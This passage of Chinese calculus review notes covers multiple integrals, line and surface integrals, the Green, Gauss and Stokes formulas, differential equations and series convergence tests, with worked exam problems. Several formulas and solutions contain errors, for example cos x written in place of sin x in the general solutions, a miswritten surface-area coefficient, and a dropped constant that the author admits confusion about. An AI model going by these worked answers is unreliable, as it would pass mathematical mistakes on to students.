$A=-2e^{-\\frac{1}{2}}&lt;0$，$B=0$</p>\n<h3 id=\"第七章-重积分\"><a href=\"#第七章-重积分\" class=\"headerlink\" title=\"第七章 重积分\"></a>第七章 重积分</h3><h4 id=\"1-二重积分的概念与性质\"><a href=\"#1-二重积分的概念与性质\" class=\"headerlink\" title=\"1. 二重积分的概念与性质\"></a>1. 二重积分的概念与性质</h4><h4 id=\"2-二重积分的计算\"><a href=\"#2-二重积分的计算\" class=\"headerlink\" title=\"2. 二重积分的计算\"></a>2. 二重积分的计算</h4><p><strong>例</strong>（2021-2022第二学期期末，2）求 $I=\\int_0^1\\mathrm{d}x\\int_0^{\\sqrt{1-x^2}}(x^2+y^2)\\mathrm{d}y$<br><strong>解</strong> 作极坐标变换 $x=r\\cos\\theta,y=r\\sin\\theta$，则<br>$$<br>I = \\int_0^{\\frac{\\pi}{4}}\\mathrm{d}\\theta\\int_0^1 r\\cdot r\\mathrm{d}r = \\frac{\\pi}{12}<br>$$<br><strong>例</strong>（2017-2018第二学期期末，1）计算二重积分 $\\iint_D\\frac{|y|}{x^2+y^2}\\mathrm{d}x\\mathrm{d}y$，其中 $D$ 为圆环区域 $1\\leq x^2+y^2\\leq 4$。<br><strong>解</strong> 作极坐标变换，有<br>$$<br>I = \\int_0^{2\\pi}\\mathrm{d}\\theta\\int_1^2 \\frac{|r\\sin\\theta|}{r^2}\\cdot\\mathrm{d}r = \\int_0^{2\\pi}|\\sin\\theta|\\mathrm{d}\\theta\\int_1^2\\mathrm{d}r = 4\\int_0^{\\frac{\\pi}{2}}\\sin\\theta \\mathrm{d}\\theta\\int_1^2\\mathrm{d}r = 4<br>$$</p>\n<h4 id=\"3-三重积分的概念与计算\"><a href=\"#3-三重积分的概念与计算\" class=\"headerlink\" title=\"3. 三重积分的概念与计算\"></a>3. 三重积分的概念与计算</h4><h4 id=\"4-重积分的应用举例\"><a href=\"#4-重积分的应用举例\" class=\"headerlink\" title=\"4. 重积分的应用举例\"></a>4. 重积分的应用举例</h4><p>曲面 $S$ 由参数方程 $x=x(u,v),y=y(u,v),z=z(u,v), (u,v)\\in D’$ 给出时，可计算<br>$$<br>E = x_u^2+y_u^2+z_u^2 \\\\<br>F = x_ux_v+y_ux_v+z_ux_v \\\\<br>G = x_v^2+y_v^2+z_v^2<br>$$<br>从而<br>$$<br>S = \\iint\\limits_{D’}\\sqrt{EG-F^2}\\mathrm{d}u\\mathrm{d}v<br>$$</p>\n<h3 id=\"第八章-曲线积分与曲面积分\"><a href=\"#第八章-曲线积分与曲面积分\" class=\"headerlink\" title=\"第八章 曲线积分与曲面积分\"></a>第八章 曲线积分与曲面积分</h3><h4 id=\"1-第一型曲线积分（对弧长的曲线积分）\"><a href=\"#1-第一型曲线积分（对弧长的曲线积分）\" class=\"headerlink\" title=\"1. 第一型曲线积分（对弧长的曲线积分）\"></a>1. 第一型曲线积分（对弧长的曲线积分）</h4><p>这个非常地简单直观，就是求一条曲线（如二次函数的某一段）的长度。<br>平面曲线求法：<br>$$<br>\\int_Lf(x,y)ds=\\int_\\alpha^\\beta f[x(t),y(t)]\\sqrt{[x’(t)]^2+[y’(t)]^2}dt \\\\<br>or \\int_Lf(x,y)ds=\\int_\\alpha^\\beta f[x,y(x)]\\sqrt{[1+[y’(x)]^2}dxdy<br>$$<br>空间曲线类似：<br>$$<br>\\int_Lf(x,y,z)ds=\\int_\\alpha^\\beta f[x(t),y(t),z(t)]\\sqrt{[x’(t)]^2+[y’(t)]^2+[z’(t)]^2}dt \\\\<br>$$</p>\n<h4 id=\"2-第二型曲线积分（对坐标的曲线积分）\"><a href=\"#2-第二型曲线积分（对坐标的曲线积分）\" class=\"headerlink\" title=\"2. 第二型曲线积分（对坐标的曲线积分）\"></a>2. 第二型曲线积分（对坐标的曲线积分）</h4><p>这个看起来就不那么地直观，其物理背景是求变力在曲线上做功，大概想象一下子。<br>计算方法：<br>$$<br>\\int_{\\overset{\\frown}{AB}}P(x,y)dx=\\int_\\alpha^\\beta P[x(t),y(t)]x’(t)dt \\\\<br>\\int_{\\overset{\\frown}{AB}}Q(x,y)dy=\\int_\\alpha^\\beta Q[x(t),y(t)]y’(t)dt<br>$$<br>两类曲线积分关系：<br>$$<br>\\int_LPdx+Qdy=\\int_L(Pcos\\alpha +Qcos\\beta )ds \\\\<br>or \\int_\\Gamma Pdx+Qdy+Rdz=\\int_L(Pcos\\alpha +Qcos\\beta +Rcos\\gamma )ds<br>$$</p>\n<h4 id=\"3-格林公式\"><a href=\"#3-格林公式\" class=\"headerlink\" title=\"3. 格林公式\"></a>3. 格林公式</h4><p>就一道式子：<br>$$<br>∮_L Pdx+Qdy=∬\\limits_D( \\frac{ \\partial Q }{ \\partial x }- \\frac{ \\partial P }{ \\partial y })dxdy\\\\<br>$$<br>条件是函数 $P$ 和 $Q$ 在平面区域 $D$ 上有连续的偏导数 <del>，这个条件一般不管，</del> 主要是<strong>边界曲线 $L$ 闭合</strong>就行。<br>格林公式可以将<strong>第二类曲线积分</strong>化为简单的二重积分，非常地不错。</p>\n<blockquote>\n<p>PS:以下这些符号的 Latex 支持不是很好，直接用字符了。<br>$$<br>∮ \\ ∯ \\ ∰ \\ ∱ \\ ∲ \\ ∳<br>$$</p>\n</blockquote>\n<p><strong>例</strong>（2020-2021第二学期期末，2）计算曲线积分 $∮_L(xy^2-\\sin y)\\mathrm{d}y-(\\cos x+x^2y)\\mathrm{d}x$ ，其中 $L$ 为圆周 $x^2+y^2=4$ ，积分方向为沿 $L$ 逆时针方向。<br><strong>解</strong> $L$ 为闭合曲线，且 $P,Q$ 在 $L$ 围成的 $D$ 上偏导也连续，所以可以用格林公式：<br>$$<br>\\begin{aligned}<br>I&amp;=\\iint\\limits_D[y^2-(-x^2)]\\mathrm{d}x\\mathrm{d}y \\\\<br>&amp;=\\int_0^{2\\pi}\\mathrm{d}\\theta\\int_0^2r^2\\cdot r\\mathrm{d}r \\\\<br>&amp;=8\\pi<br>\\end{aligned}<br>$$</p>\n<h4 id=\"4-第一型曲面积分\"><a href=\"#4-第一型曲面积分\" class=\"headerlink\" title=\"4. 第一型曲面积分\"></a>4. 第一型曲面积分</h4><p>和第一型曲线积分一样直观，就是求一个曲面的面积。<br>计算方法：<br>$$<br>\\iint \\limits_{\\Sigma} f(x,y,z) \\mathrm{d}S=\\iint \\limits_{D_{xy}}f[x,y,z(x,y)]\\sqrt{1+(\\frac{\\partial z}{\\partial x})^2+(\\frac{\\partial z}{\\partial y})^2}\\mathrm{d}x\\mathrm{d}y<br>$$</p>\n<h4 id=\"5-第二型曲面积分\"><a href=\"#5-第二型曲面积分\" class=\"headerlink\" title=\"5. 第二型曲面积分\"></a>5. 第二型曲面积分</h4><p>计算方法：<br>$$<br>\\iint \\limits_{\\Sigma} R(x,y,z) \\mathrm{d}S=\\iint \\limits_{D_{xy}}R[x,y,z(x,y)]\\mathrm{d}x\\mathrm{d}y<br>$$</p>\n<p>两类曲面积分关系：<br>$$<br>\\iint \\limits_\\Sigma P\\mathrm{d}y\\mathrm{d}z+Q\\mathrm{d}x\\mathrm{d}z+R\\mathrm{d}x\\mathrm{d}y=\\iint \\limits_\\Sigma(Pcos\\alpha+Qcos\\beta+Rcos\\gamma)\\mathrm{d}S<br>$$</p>\n<h4 id=\"6-高斯公式与斯托克斯公式\"><a href=\"#6-高斯公式与斯托克斯公式\" class=\"headerlink\" title=\"6. 高斯公式与斯托克斯公式\"></a>6. 高斯公式与斯托克斯公式</h4><p><strong>高斯公式</strong>：<br>$$<br>∯ \\limits_\\Sigma P\\mathrm{d}y\\mathrm{d}z+Q\\mathrm{d}x\\mathrm{d}z+R\\mathrm{d}x\\mathrm{d}y=\\iiint \\limits_\\Omega(\\frac{\\partial P}{\\partial x}+\\frac{\\partial Q}{\\partial y}+\\frac{\\partial R}{\\partial z})\\mathrm{d}x\\mathrm{d}y\\mathrm{d}z \\\\<br>or ∯ \\limits_\\Sigma(P\\mathrm{cos}\\alpha+Q\\mathrm{cos}\\beta+R\\mathrm{cos}\\gamma)\\mathrm{d}S=\\iiint \\limits_\\Omega(\\frac{\\partial P}{\\partial x}+\\frac{\\partial Q}{\\partial y}+\\frac{\\partial R}{\\partial z})\\mathrm{d}x\\mathrm{d}y\\mathrm{d}z<br>$$<br><strong>例</strong>（2021-2022第二学期期末，3）计算曲面积分 $∯ \\limits_\\Sigma(x-z)\\mathrm{d}y\\mathrm{d}z+z\\mathrm{d}x\\mathrm{d}y$ ，其中 $\\Sigma$ 是由 $z=x^2+2y^2$ 与 $z=1$ 所围成立体表面的外侧。<br><strong>解</strong> $\\Sigma$ 是封闭曲面，直接上高斯公式，有<br>$$<br>I=\\iiint \\limits_\\Omega(1+1)\\mathrm{d}x\\mathrm{d}y\\mathrm{d}z=2\\iiint \\limits_\\Omega\\mathrm{d}V<br>$$<br>作柱面坐标变换 $x=r\\cos\\theta,y=\\frac{r\\sin\\theta}{\\sqrt2}$ ，得<br>$$<br>I=\\int_0^{2\\pi}\\mathrm{d}\\theta\\int_0^1\\mathrm{d}r\\int_0^1\\frac{r}{\\sqrt{2}}dz=\\frac{\\pi}{\\sqrt2}<br>$$</p>\n<blockquote>\n<p>直角坐标与柱面坐标关系：<br>$$<br>\\left\\{<br>\\begin{aligned}<br>x&amp;=r\\cos\\theta \\\\<br>y&amp;=r\\sin\\theta \\\\<br>z&amp;=z<br>\\end{aligned}<br>\\right.<br>$$<br>此时 $\\mathrm{d}V=r\\mathrm{d}r\\mathrm{d}\\theta\\mathrm{d}z$<br>直角坐标与球面坐标关系：<br>$$<br>\\left\\{<br>\\begin{aligned}<br>x&amp;=r\\sin\\varphi\\cos\\theta \\\\<br>y&amp;=r\\sin\\varphi\\sin\\theta \\\\<br>z&amp;=r\\cos\\varphi<br>\\end{aligned}<br>\\right.<br>$$<br>此时 $\\mathrm{d}V=r^2\\sin\\varphi\\mathrm{d}r\\mathrm{d}\\theta\\mathrm{d}\\varphi$</p>\n</blockquote>\n<p><strong>斯托克斯公式</strong>：<br>$$<br>∮_L P\\mathrm{d}x+Q\\mathrm{d}y+R\\mathrm{d}z=\\iint \\limits_\\Sigma<br>\\begin{vmatrix}<br>\\mathrm{d}y\\mathrm{d}z &amp; \\mathrm{d}x\\mathrm{d}z &amp; \\mathrm{d}x\\mathrm{d}y \\\\<br>\\frac{\\partial}{\\partial x} &amp; \\frac{\\partial}{\\partial y} &amp; \\frac{\\partial}{\\partial z} \\\\<br>P &amp; Q &amp; R<br>\\end{vmatrix}=<br>\\iint \\limits_\\Sigma<br>\\begin{vmatrix}<br>\\mathrm{cos}\\alpha &amp; \\mathrm{cos}\\beta &amp; \\mathrm{cos}\\gamma \\\\<br>\\frac{\\partial}{\\partial x} &amp; \\frac{\\partial}{\\partial y} &amp; \\frac{\\partial}{\\partial z} \\\\<br>P &amp; Q &amp; R<br>\\end{vmatrix}<br>\\mathrm{d}S<br>$$</p>\n<h3 id=\"第九章-常微分方程\"><a href=\"#第九章-常微分方程\" class=\"headerlink\" title=\"第九章 常微分方程\"></a>第九章 常微分方程</h3><h4 id=\"1-基本概念\"><a href=\"#1-基本概念\" class=\"headerlink\" title=\"1. 基本概念\"></a>1. 基本概念</h4><p>所谓常微分方程，就是区别于偏微分方程，未知函数是<strong>一元函数</strong>，而不是多元。<br>常微分方程的阶数即肉眼可见的导数的最高阶，如 $y’’’+2(y’’)^3+y^2+x^5$ 就是三阶常微分方程。<br><strong>通解</strong>的概念：$n$ 阶常微分方程有解 $y=\\varphi(x;C_1,\\cdots,C_n)$ ，其中 $C_1,\\cdots,C_n$ 是 $n$ 个独立的任意常数，则称其为方程的一个通解；相对的，就有特解的概念，即方程的任何一个不包含任意常数的解。用数学语言表达独立性，有雅可比行列式不为零，即<br>$$<br>\\frac{D(\\varphi,\\varphi’,\\cdots,\\varphi^{n-1})}{D(C_1,C_2,\\cdots,C_n)}\\ne0<br>$$</p>\n<p>举个例子，经典方程 $y’’+y=0$ 有解 $y=C_1\\mathrm{sin}x+C_2\\mathrm{cos}x$ ，则雅可比行列式为<br>$$<br>\\frac{D(y,y’)}{D(C_1,C_2)}=<br>\\begin{vmatrix}<br>\\mathrm{sin}x &amp; \\mathrm{cos}x \\\\<br>\\mathrm{cos}x &amp; -\\mathrm{sin}x<br>\\end{vmatrix}<br>=-1 \\ne 0<br>$$<br>可能你会问这个雅可比行列式具体怎么出來的，其实第一行就是 $y$ 分别对 $C_1$ 和 $C_2$ 求导，第二行是 $y’$ 对 $C_1$ 和 $C_2$ 求导。<br>故 $C_1,C_2$ 是两个独立的任意常数，进而 $y=C_1\\mathrm{sin}x+C_2\\mathrm{cos}x$ 是方程的通解。</p>\n<h4 id=\"2-初等积分法\"><a href=\"#2-初等积分法\" class=\"headerlink\" title=\"2. 初等积分法\"></a>2. 初等积分法</h4><h5 id=\"2-1-变量分离的方程\"><a href=\"#2-1-变量分离的方程\" class=\"headerlink\" title=\"2.1 变量分离的方程\"></a>2.1 变量分离的方程</h5><h5 id=\"2-2-可化为变量分离的几类方程\"><a href=\"#2-2-可化为变量分离的几类方程\" class=\"headerlink\" title=\"2.2 可化为变量分离的几类方程\"></a>2.2 可化为变量分离的几类方程</h5><h5 id=\"2-3-一阶线性微分方程\"><a href=\"#2-3-一阶线性微分方程\" class=\"headerlink\" title=\"2.3 一阶线性微分方程\"></a>2.3 一阶线性微分方程</h5><p>形如<br>$$<br>\\frac{\\mathrm{d}y}{\\mathrm{d}x}+P(x)y=Q(x)<br>$$<br>的一阶微分方程就叫一阶线性微分方程。<br>一般套公式就行，若 $Q(x)\\equiv0$ ，则为齐次方程，直接积分有通解 $y=C\\mathrm{e}^{-\\int P(x)\\mathrm{d}x}$ ；若为非齐次方程则用<strong>常数变易法</strong>求得通解<br>$$<br>y=\\mathrm{e}^{-\\int P(x)\\mathrm{d}x}\\left[\\int Q(x)\\mathrm{e}^{\\int P(x)\\mathrm{d}x}dx+C\\right]<br>$$<br>然后还有<strong>贝努里方程</strong>（当然贝努利方程也是它，音译嘛）长这样：<br>$$<br>\\frac{\\mathrm{d}y}{\\mathrm{d}x}+P(x)y=Q(x)y^n\\ (n\\ne0,1)<br>$$<br>作变量代换 $z=y^{1-n}$ ，可化为一阶线性方程<br>$$<br>\\frac{\\mathrm{d}z}{\\mathrm{d}x}+(1-n)P(x)z=(1-n)Q(x)<br>$$</p>\n<h5 id=\"2-4-全微分方程与积分因子\"><a href=\"#2-4-全微分方程与积分因子\" class=\"headerlink\" title=\"2.4 全微分方程与积分因子\"></a>2.4 全微分方程与积分因子</h5><p><strong>例</strong>（2021-2022第二学期期末，4）求微分方程 $x\\mathrm{d}y+(y+x^2)\\mathrm{d}x=0$ 的通解。<br><strong>解</strong> $\\frac{\\partial P}{\\partial y}=1=\\frac{\\partial Q}{\\partial x}$，且它们在全平面上连续，故方程为全微分方程。下求原函数 $u(x,y)$ ，由 $\\frac{\\partial u}{\\partial x}=P(x,y)=y+x^2$ ，对 $x$ 积分得<br>$$<br>u(x,y)=xy+\\frac{x^3}{3}+\\varphi(y)<br>$$<br>上式对 $y$ 求偏导得<br>$$<br>\\frac{\\partial u}{\\partial y}=x+\\varphi’(y)<br>$$<br>另一方面，<br>$$<br>\\frac{\\partial u}{\\partial y}=Q(x,y)=x<br>$$<br>比较上两式得 $\\varphi’(y)=0$ ，因而 $\\varphi(y)=0$（这里省略积分常数，不影响后面的通积分表达式），故原函数为 $u(x,y)=xy+\\frac{x^3}{3}$ ，故方程的通解为<br>$$<br>xy+\\frac{x^3}{3}=C<br>$$<br>其中 $C$ 为任意常数。</p>\n<blockquote>\n<p>微分方程的通解也叫通积分</p>\n</blockquote>\n<h5 id=\"2-5-可降阶的二阶微分方程\"><a href=\"#2-5-可降阶的二阶微分方程\" class=\"headerlink\" title=\"2.5 可降阶的二阶微分方程\"></a>2.5 可降阶的二阶微分方程</h5><p><strong>例</strong>（2021-2022第二学期期末，5）求微分方程 $y’’=y’\\cdot y$ 的通解。<br><strong>解</strong> 方程中不显含变量 $x$ ，令 $p=y’$ ，并将 $y$ 看作自变量，有 $y’’=p\\frac{\\mathrm{d}p}{\\mathrm{d}y}$ ，代入有<br>$$<br>p\\frac{\\mathrm{d}p}{\\mathrm{d}y}=p\\cdot y<br>$$<br>若 $p=y’=0$ ，则通解为 $y=C$ ，若 $p\\ne0$ ，则有<br>$$<br>\\begin{aligned}<br>\\frac{\\mathrm{d}p}{\\mathrm{d}y}&amp;=y \\\\<br>\\int\\mathrm{d}p&amp;=\\int y\\mathrm{d}y \\\\<br>p&amp;=\\frac{1}{2}y^2+C_1<br>\\end{aligned}<br>$$<br>即 $\\frac{\\mathrm{d}y}{\\mathrm{d}x}=\\frac{1}{2}y^2+C_1$ ，再次分离分量，有<br>$$<br>\\begin{aligned}<br>\\frac{\\mathrm{d}y}{\\mathrm{d}x}&amp;=\\frac{1}{2}y^2+C_1 \\\\<br>\\int\\frac{2}{y^2}\\mathrm{d}y&amp;=\\int\\mathrm{d}x + C_2 \\\\<br>-\\frac{2}{y}&amp;=x+C_3 \\\\<br>y&amp;=-\\frac{2}{x}+C<br>\\end{aligned}<br>$$</p>\n<blockquote>\n<p>这里面的常量 $C$ 变得我也很迷糊，但是结果代进去是对的，就先这样吧（）</p>\n</blockquote>\n<p><strong>例</strong>（2020-2021第二学期期末，5）求微分方程 $\\frac{\\mathrm{d}^2y}{\\mathrm{d}x^2}=(\\frac{\\mathrm{d}y}{\\mathrm{d}x})^3+\\frac{\\mathrm{d}y}{\\mathrm{d}x}$ 的通解。<br><strong>解</strong> 令 $p=y’$ ，有 $y’’=p\\frac{\\mathrm{d}p}{\\mathrm{d}y}$ ，代入有<br>$$<br>p\\frac{\\mathrm{d}p}{\\mathrm{d}y}=(p^3+p) \\\\<br>\\frac{1}{p^2+p}\\mathrm{d}p=\\mathrm{d}y \\\\<br>\\arctan p=y+C_1<br>$$<br>即有 $\\frac{\\mathrm{d}y}{\\mathrm{d}x}=p=\\tan(y+C_1)$ ，再次分离分量，有<br>$$<br>\\frac{\\mathrm{d}y}{\\tan(y+C_1)}=\\mathrm{d}x \\\\<br>\\ln\\sin(y+C_1)=x+C_2<br>$$<br>最终得出 $y=\\arcsin e^{x+C_2}-C_1$</p>\n<h4 id=\"3-微分方程解的存在唯一性定理\"><a href=\"#3-微分方程解的存在唯一性定理\" class=\"headerlink\" title=\"3. 微分方程解的存在唯一性定理\"></a>3. 微分方程解的存在唯一性定理</h4><h4 id=\"4-高阶线性微分方程\"><a href=\"#4-高阶线性微分方程\" class=\"headerlink\" title=\"4. 高阶线性微分方程\"></a>4. 高阶线性微分方程</h4><h4 id=\"5-二阶线性常系数微分方程\"><a href=\"#5-二阶线性常系数微分方程\" class=\"headerlink\" title=\"5. 二阶线性常系数微分方程\"></a>5. 二阶线性常系数微分方程</h4><table>\n<thead>\n<tr>\n<th>特征根</th>\n<th>通解形式</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>两相异实根 $\\lambda_1,\\lambda_2$</td>\n<td>$C_1e^{\\lambda_1x}+C_2e^{\\lambda_2x}$</td>\n</tr>\n<tr>\n<td>二重根 $\\lambda_1$</td>\n<td>$(C_1+C_2x)e^{\\lambda_1x}$</td>\n</tr>\n<tr>\n<td>共轭复根 $\\lambda_{1,2}=\\alpha\\pm\\mathrm{i}\\beta$</td>\n<td>$e^{\\alpha x}(C_1\\cos\\beta x+C_2\\sin\\beta x)$</td>\n</tr>\n</tbody></table>\n<table>\n<thead>\n<tr>\n<th>$f(x)$ 的形式</th>\n<th>条件</th>\n<th>特解的形式</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>$P_n(x)$</td>\n<td>“0”不是/是单/是重特征根</td>\n<td>$Q_n(x)/xQ_n(x)/x^2Q_n(x)$</td>\n</tr>\n<tr>\n<td>$ae^{\\alpha x}$</td>\n<td>$\\alpha$ 不是/是单/是重特征根</td>\n<td>$Ae^{\\alpha x}/Axe^{\\alpha x}/Ax^2e^{\\alpha x}$</td>\n</tr>\n<tr>\n<td>$a\\cos\\beta x+b\\sin\\beta x$</td>\n<td>$\\pm\\mathrm{i}\\beta$ 不是/是特征根</td>\n<td>$A\\cos\\beta x+B\\sin\\beta x/x(A\\cos\\beta x+B\\sin\\beta x)$</td>\n</tr>\n<tr>\n<td>$P_n(x)e^{\\alpha x}$</td>\n<td>$\\alpha$ 不是/是单/是重特征根</td>\n<td>$Q_n(x)e^{\\alpha x}/xQ_n(x)e^{\\alpha x}/x^2Q_n(x)e^{\\alpha x}$</td>\n</tr>\n<tr>\n<td>$P_n(x)e^{\\alpha x}(a\\cos\\beta x+b\\sin\\beta x)$</td>\n<td>$\\alpha\\pm\\mathrm{i}\\beta$ 不是/是特征根</td>\n<td>$e^{\\alpha x}[Q_n(x)\\cos\\beta x+R_n(x)\\sin\\beta x]/xe^{\\alpha x}[Q_n(x)\\cos\\beta x+R_n(x)\\sin\\beta x]$</td>\n</tr>\n</tbody></table>\n<p>咋一看很多，其实挺有规律，比如多一个根就多乘一个 $x$ ，原来的系数变成待定的。</p>\n<p><strong>例</strong>（2021-2022第二学期期末，6）求微分方程 $y’’+y=e^{3x}(x+2)$ 的通解。<br><strong>解</strong> 先求对应齐次微分方程 $y’’+y=0$ 的通解，特征方程 $\\lambda^2+1=0$ 的特征根 $\\lambda_{1,2}=\\pm \\mathrm{i}$ ，故通解形式为<br>$$<br>y(x)=e^{ax}(C_1\\cos\\beta x+C_2\\sin\\beta x)=C_1\\cos x+C_2\\cos x<br>$$<br>其中 $C_1,C_2$ 为任意常数<br>再用待定系数法求特解，“3“不是特征根，故设方程有特解 $y=(Ax+B)e^{3x}$ ，则<br>$$<br>\\begin{aligned}<br>y’&amp;=Ae^{3x}+3(Ax+B)e^{3x} \\\\<br>y’’&amp;=3Ae^{3x}+3Ae^{3x}+9(Ax+B)e^{3x}=(9Ax+6A+9B)e^{3x} \\\\<br>\\end{aligned}<br>$$<br>回代得<br>$$<br>y’’+y=(10Ax+6A+10B)e^{3x}=e^{3x}(x+2)<br>$$<br>解得 $A=\\frac{1}{10},\\ B=\\frac{7}{50}$ ，故特解为 $y=(\\frac{1}{10}x+\\frac{7}{50})e^{3x}$ ，与齐次方程通解相加，得出所求非齐次方程通解为<br>$$<br>y(x)=C_1\\cos x+C_2\\cos x+(\\frac{1}{10}x+\\frac{7}{50})e^{3x}<br>$$<br>其中 $C_1,C_2$ 为任意常数。</p>\n<p><strong>例</strong>（2020-2021第二学期期末，6）求微分方程 $\\frac{\\mathrm{d}^2y}{\\mathrm{d}x^2}+y=e^x+\\cos x$ 的通解。<br><strong>解</strong> 特征方程 $\\lambda^2+1=0$ 的特征根 $\\lambda_{1,2}=\\pm \\mathrm{i}$ ，故齐次方程通解形式为<br>$$<br>y(x)=e^{ax}(C_1\\cos\\beta x+C_2\\sin\\beta x)=C_1\\cos x+C_2\\cos x<br>$$<br>这个方程的非齐次项由两项组成，就先分别求两项的特解，再相加，就是原方程的特解。<br>对方程 $y’’+y=e^x$ 不难求得特解 $y=\\frac{1}{2}e^x$ ，方程 $y’’+y=\\cos x$ 的特解 $y=\\frac{1}{2}x\\cos x$ ，故原方程的特解为<br>$$<br>y=\\frac{1}{2}(e^x+x\\cos x)<br>$$<br>与齐次方程通解相加，得出所求非齐次方程通解为<br>$$<br>y(x)=C_1\\cos x+C_2\\cos x+\\frac{1}{2}(e^x+x\\cos x)<br>$$</p>\n<h4 id=\"6-用常数变易法求解二阶线性非齐次方程与欧拉方程的解法\"><a href=\"#6-用常数变易法求解二阶线性非齐次方程与欧拉方程的解法\" class=\"headerlink\" title=\"6. 用常数变易法求解二阶线性非齐次方程与欧拉方程的解法\"></a>6. 用常数变易法求解二阶线性非齐次方程与欧拉方程的解法</h4><h4 id=\"7-常系数线性微分方程组\"><a href=\"#7-常系数线性微分方程组\" class=\"headerlink\" title=\"7. 常系数线性微分方程组\"></a>7. 常系数线性微分方程组</h4><h3 id=\"第十章-无穷级数\"><a href=\"#第十章-无穷级数\" class=\"headerlink\" title=\"第十章 无穷级数\"></a>第十章 无穷级数</h3><h4 id=\"1-柯西收敛原理与数项级数的概念\"><a href=\"#1-柯西收敛原理与数项级数的概念\" class=\"headerlink\" title=\"1. 柯西收敛原理与数项级数的概念\"></a>1. 柯西收敛原理与数项级数的概念</h4><h4 id=\"2-正项级数的收敛判别法\"><a href=\"#2-正项级数的收敛判别法\" class=\"headerlink\" title=\"2. 正项级数的收敛判别法\"></a>2. 正项级数的收敛判别法</h4><ol>\n<li>比较审敛法<br>比收敛小的就收敛，比发散大的就发散</li>\n<li>比值审敛法<br>$\\lim\\limits_{n\\to\\infty}\\frac{u_{n+1}}{u_n}$ 小于 1 就收敛，大于 1 就发散，等于 1 时敛散性不定</li>\n<li>根值审敛法<br>与上面类似，$\\lim\\limits_{n\\to\\infty}\\sqrt[n]{u_n}$ 小于 1 就收敛，大于 1 就发散，等于 1 时敛散性不定</li>\n<li>对数审敛法</li>\n</ol>\n<p><strong>例</strong>（2021-2022第二学期期末，10-1）判断数项级数 $\\sum\\limits_{n=1}^{\\infty}3^n\\sin(\\frac{\\pi}{4^n})$ 的敛散性。<br><strong>解</strong> 放缩一下再比较判别法<br>$$<br>\\sum_{n=1}^{\\infty}3^n\\sin(\\frac{\\pi}{4^n})&lt;\\sum_{n=1}^{\\infty}3^n(\\frac{\\pi}{4^n})=\\pi\\sum_{n=1}^{\\infty}(\\frac{3}{4})^n<br>$$<br>由于 $\\sum_{n=1}^{\\infty}(\\frac{3}{4})^n$ 收敛，故原级数收敛。</p>\n<h4 id=\"3-任意项级数\"><a href=\"#3-任意项级数\" class=\"headerlink\" title=\"3. 任意项级数\"></a>3. 任意项级数</h4><p><strong>莱布尼茨判别法</strong> 若交错级数满足下列条件：<br>$$<br>(1)u_n\\geqslant u_{n+1}; \\\\<br>(2)\\lim_{n\\rightarrow\\infty}=0,<br>$$<br>则级数收敛。<br><strong>狄利克雷判别法</strong> 考虑级数<br>$$<br>\\sum_{k=1}^{\\infty}a_kb_k<br>$$<br>若序列 ${a_k}$ 单调且 $\\lim\\limits_{k\\rightarrow\\infty}a_k=0$ ，又级数 $\\sum\\limits_{n=1}^{\\infty}b_k$ 的部分和序列有界，则级数 $\\sum\\limits_{k=1}^{\\infty}a_kb_k$ 收敛。<br><strong>例</strong>（2021-2022第二学期期末，10-2）判断数项级数 $\\sum\\limits_{n=2}^{\\infty}\\frac{\\cos(2n)}{\\ln n}$ 的敛散性。<br><strong>解</strong> 取 $a_k=\\frac{1}{\\ln n}$ ，易证得 $a_k$ 单调且 $\\lim\\limits_{k\\rightarrow\\infty}a_k=0$ ，下证级数 $\\sum\\limits_{n=2}^{\\infty}\\cos(2n)$ 的部分和序列有界：<br>$$<br>\\begin{aligned}<br>\\left|\\sum_{k=2}^{n}\\cos(2k)\\right|&amp;=\\left|\\cos4+\\cos6+\\cdots+\\cos2n\\right| \\\\<br>&amp;=\\frac{1}{\\sin1}\\left|\\cos4\\sin1+\\cos6\\sin1+\\cdots+\\cos2n\\sin1\\right| \\\\<br>&amp;=\\frac{1}{\\sin1}\\left|\\frac{\\sin5-\\sin3}{2}+\\frac{\\sin7-\\sin5}{2}+\\cdots+\\frac{\\sin(2n+1)-\\sin(2n-1)}{2}\\right| \\\\<br>&amp;=\\frac{1}{\\sin1}\\left|\\frac{\\sin(2n+1)-\\sin3}{2}\\right| \\\\<br>&amp;\\leqslant\\frac{1}{\\sin1}<br>\\end{aligned}<br>$$<br>故级数 $\\sum\\limits_{n=2}^{\\infty}\\frac{\\cos(2n)}{\\ln n}$ 收敛。</p>\n<blockquote>\n<p><strong>积化和差公式</strong><br>$$<br>{\\displaystyle \\sin \\alpha \\cos \\beta ={\\sin(\\alpha +\\beta )+\\sin(\\alpha -\\beta ) \\over 2}} \\\\<br>{\\displaystyle \\cos \\alpha \\sin \\beta ={\\sin(\\alpha +\\beta )-\\sin(\\alpha -\\beta ) \\over 2}} \\\\<br>{\\displaystyle \\cos \\alpha \\cos \\beta ={\\cos(\\alpha +\\beta )+\\cos(\\alpha -\\beta ) \\over 2}} \\\\<br>{\\displaystyle \\sin \\alpha \\sin \\beta ={\\cos(\\alpha +\\beta )-\\cos(\\alpha -\\beta ) \\over -2}}<br>$$</p>\n</blockquote>\n<p><strong>阿贝尔判别法</strong><br>（1）无穷数列 ${a_k}$ 单调有界<br>（2）级数 $\\sum\\limits_{k=1}^\\infty b_k$ 收敛<br>则级数 $\\sum\\limits_{k=1}^\\infty a_kb_k$ 收敛。</p>\n<h4 id=\"4-函数项级数\"><a href=\"#4-函数项级数\" class=\"headerlink\" title=\"4. 函数项级数\"></a>4. 函数项级数</h4><h5 id=\"4-1-函数序列及函数项级数的一致收敛性\"><a href=\"#4-1-函数序列及函数项级数的一致收敛性\" class=\"headerlink\" title=\"4.1 函数序列及函数项级数的一致收敛性\"></a>4.1 函数序列及函数项级数的一致收敛性</h5><h5 id=\"4-2-函数项级数一致收敛的必要条件与判别法\"><a href=\"#4-2-函数项级数一致收敛的必要条件与判别法\" class=\"headerlink\" title=\"4.2 函数项级数一致收敛的必要条件与判别法\"></a>4.2 函数项级数一致收敛的必要条件与判别法</h5><p><strong>强级数判别法</strong> 若函数项级数 $\\sum\\limits_{n=1}^\\infty u_n(x)$ 的一般项满足：<br>$$<br>|u_n(x)|\\leqslant a_n,\\quad \\forall x\\in X,n=1,2,\\cdots,<br>$$<br>且正项级数 $\\sum\\limits_{n=1}^\\infty a_n$ 收敛，则该函数项级数在 $X$ 上一致收敛。</p>\n<p><strong>狄利克雷判别法</strong> 与数项级数的狄利克雷判别法类似。<br>（1）在 $X$ 中任意取定一个 $x$ ，数列 